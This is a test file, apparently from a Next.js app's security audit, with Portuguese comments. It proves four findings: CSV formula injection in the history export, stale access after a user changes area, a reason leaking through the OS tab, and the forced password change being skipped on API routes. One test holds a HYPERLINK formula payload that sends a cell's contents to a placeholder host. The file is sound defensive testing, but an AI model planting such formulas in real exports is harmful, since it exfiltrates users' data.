/**
 * Auditoria de segurança (security-review, 28/10/2026) — testes que COMPROVAM achados.
 * Relatório: docs/auditoria/2026-10-28-security-review.md.
 *
 * Cada achado está escrito com a expectativa SEGURA e marcado `it.fails`: o teste passa enquanto o
 * problema existir (prova) e passa a falhar quando for corrigido — aí troque `it.fails` por `it`
 * e ele vira o teste de regressão da proteção.
 *
 * Banco: PGlite em memória com as migrações reais. `next/headers` é simulado (cookie de sessão).
 */
import { beforeAll, describe, expect, it, vi } from "vitest";

const req = vi.hoisted(() => {
  process.env.PGLITE_DATA_DIR = "memory://";
  delete process.env.DATABASE_URL;
  // Fora do modo demonstração: a troca obrigatória de senha vale.
  process.env.EXIBIR_DEMO = "false";
  return { cookies: new Map<string, string>(), headers: new Map<string, string>() };
});

vi.mock("server-only", () => ({}));
vi.mock("next/headers", () => ({
  cookies: async () => ({
    get: (k: string) => (req.cookies.has(k) ? { name: k, value: req.cookies.get(k)! } : undefined),
    set: (k: string, v: string) => void req.cookies.set(k, v),
    delete: (k: string) => void req.cookies.delete(k),
  }),
  headers: async () => ({ get: (k: string) => req.headers.get(k.toLowerCase()) ?? null }),
}));
vi.mock("next/navigation", () => ({
  redirect: (destino: string) => {
    throw new Error(`redirect ${destino}`);
  },
  notFound: () => {
    throw new Error("notFound");
  },
}));

import { eq } from "drizzle-orm";
import { SemPermissaoError } from "@/domain/errors";
import { podeEditarSolicitacao } from "@/domain/permissions";
import { getDb } from "@/server/db";
import { usuarios } from "@/server/db/schema";
import { COOKIE_SESSAO, getUsuarioReal } from "@/server/auth/session";
import { conferirLinha, obterLinhasAta } from "@/server/services/eventos";
import { obterSolicitacao } from "@/server/services/solicitacoes";
import { editarUsuario } from "@/server/services/admin";
import { abrirSessao, criarUsuario, enviarSolicitacao, itemAvulso, migrarBanco, montarElenco, novoEvento, rascunho, type Elenco } from "@/test/apoio";
import { GET as historicoCsv } from "@/app/api/historico/csv/route";

let E: Elenco;

beforeAll(async () => {
  await migrarBanco();
  E = await montarElenco();
}, 120_000);

/** Entra como o usuário (cookie de sessão de verdade no banco). */
async function entrarComo(usuarioId: string, caminho: string | null = null) {
  req.cookies.clear();
  req.headers.clear();
  req.cookies.set(COOKIE_SESSAO, await abrirSessao(usuarioId));
  if (caminho) req.headers.set("x-npe-caminho", caminho);
}

describe("SEC-01 · CSV do histórico sem proteção contra fórmula (CSV injection)", { timeout: 120_000 }, () => {
  // Texto livre de um requisitante vira o começo da descrição do histórico quando a logística confere a
  // linha na reunião ("<descrição>: conferida na reunião"). /api/historico/csv só põe aspas na célula —
  // o Excel executa célula entre aspas que começa com "=". A rota /api/os/[id]/[setor] já neutraliza
  // (csvEscape com prefixo "'"), esta não.
  const FORMULA = '=HYPERLINK("http://exemplo.invalido/?x="&A1,"Abrir")';

  it("a célula exportada não começa com = (texto vindo de um requisitante)", async () => {
    const ev = await novoEvento(E.logistica);
    await enviarSolicitacao(E.requisitante, E.admin, ev.id, [itemAvulso(FORMULA)]);
    const linha = (await obterLinhasAta(ev.id)).find((l) => l.registro.descricaoLivre === FORMULA);
    expect(linha, "a necessidade enviada entra na ata").toBeTruthy();
    await conferirLinha(E.logistica, ev.id, linha!.registro.id, true);

    await entrarComo(E.logistica.id);
    const resposta = await historicoCsv(new Request(`http://localhost/api/historico/csv?evento=${ev.id}&periodo=7`));
    expect(resposta.status).toBe(200);
    const csv = await resposta.text();
    const celulas = csv.split(/\r\n/).flatMap((l) => l.split(";"));
    // Expectativa segura: nenhuma célula (sem as aspas) começa com = + - @.
    const perigosas = celulas.map((c) => c.replace(/^"/, "")).filter((c) => /^[=+\-@]/.test(c));
    expect(perigosas).toEqual([]);
  });
});

describe("SEC-02 · Troca de área não tira o acesso à área antiga (areasPedidas)", { timeout: 120_000 }, () => {
  // A sessão soma à área do cadastro todas as áreas em que a pessoa já criou solicitação
  // (session.ts: areasPedidasSql). Quem muda de área (ou de empresa/setor) continua vendo e EDITANDO
  // rascunhos, solicitações, motivos da logística e linhas da ata da área antiga.
  it("requisitante movido da área A para a B não abre nem edita rascunho da área A", async () => {
    const ev = await novoEvento(E.logistica);
    const migrante = await criarUsuario("Requisitante que mudou de área", "REQUISITANTE", E.areas.a);
    await rascunho(migrante, ev.id); // pediu uma vez pela área A
    // O administrador transfere a pessoa para a área B.
    await editarUsuario(E.admin, migrante.id, { nome: migrante.nome, email: migrante.email, perfil: "REQUISITANTE", areaId: E.areas.b.id, ativo: true, senha: null });
    // Um colega da área A cria um rascunho depois da transferência.
    const daA = await rascunho(E.requisitante, ev.id, [itemAvulso("Pedido interno da área A")]);

    await entrarComo(migrante.id);
    const sessao = await getUsuarioReal();
    expect(sessao?.areaId).toBe(E.areas.b.id);
    // Expectativa segura: a área A não é mais dele.
    expect(podeEditarSolicitacao(sessao!, { areaId: E.areas.a.id })).toBe(false);
    await expect(obterSolicitacao(sessao!, daA.id)).rejects.toBeInstanceOf(SemPermissaoError);
  });
});

describe("SEC-04 · Motivo da logística sobre item de outra área aparece na aba OS", { timeout: 120_000 }, () => {
  // A regra do app: motivos/observações da logística sobre itens de uma área só a própria área vê
  // (ACOES_COM_MOTIVO em obterHistoricoEvento; linha-do-tempo). A descrição das versões da OS leva o
  // motivo ("<item> 10 → 7 — <motivo>") e a aba OS (os.ver = todos) lista as versões sem filtro.
  const MOTIVO = "MOTIVO-SIGILOSO-DA-AREA-A";

  it("requisitante da área B não recebe, pela aba OS, o motivo de ajuste num item da área A", async () => {
    const { criarPeca, eventoAberto } = await import("@/test/apoio");
    const { alterarQuantidadeLinha, obterHistoricoEvento } = await import("@/server/services/eventos");
    const { listarOsResumo } = await import("@/server/services/os");
    const peca = await criarPeca();
    const { ev, linhaId } = await eventoAberto(E.logistica, peca.id, E.areas.a.id);
    await alterarQuantidadeLinha(E.logistica, ev.id, linhaId, 7, MOTIVO);

    // O histórico do evento esconde o motivo da área B (proteção existente)...
    const historicoB = await obterHistoricoEvento(E.requisitanteB, ev.id);
    expect(historicoB.some((h) => h.descricao.includes(MOTIVO))).toBe(false);
    // ...mas a aba OS (eventos/[id]/os/page.tsx → listarOsResumo) entrega a descrição da versão a qualquer perfil.
    const versoesNaAbaOs = await listarOsResumo(ev.id, E.requisitanteB);
    expect(versoesNaAbaOs.some((v) => (v.descricao ?? "").includes(MOTIVO))).toBe(false);
  });
});

describe("SEC-03 · Troca obrigatória de senha não vale nas rotas de API", { timeout: 120_000 }, () => {
  // requireUsuario (páginas e actions) manda para /perfil?trocar=1; as rotas /api/** usam
  // getUsuarioAtual, que não olha trocarSenha. Quem entra com senha provisória baixa histórico,
  // OS e ata sem trocar a senha. (Nas actions, o caminho é o da página: POST em /perfil passa.)
  it("usuário com senha provisória recebe 401/403 no CSV do histórico", async () => {
    const provisorio = await criarUsuario("Logística com senha provisória", "LOGISTICA", E.areas.logistica);
    const db = await getDb();
    await db.update(usuarios).set({ trocarSenha: true }).where(eq(usuarios.id, provisorio.id));
    await entrarComo(provisorio.id, "/api/historico/csv");
    expect((await getUsuarioReal())?.trocarSenha).toBe(true);
    const resposta = await historicoCsv(new Request("http://localhost/api/historico/csv"));
    expect([401, 403]).toContain(resposta.status);
  });
});
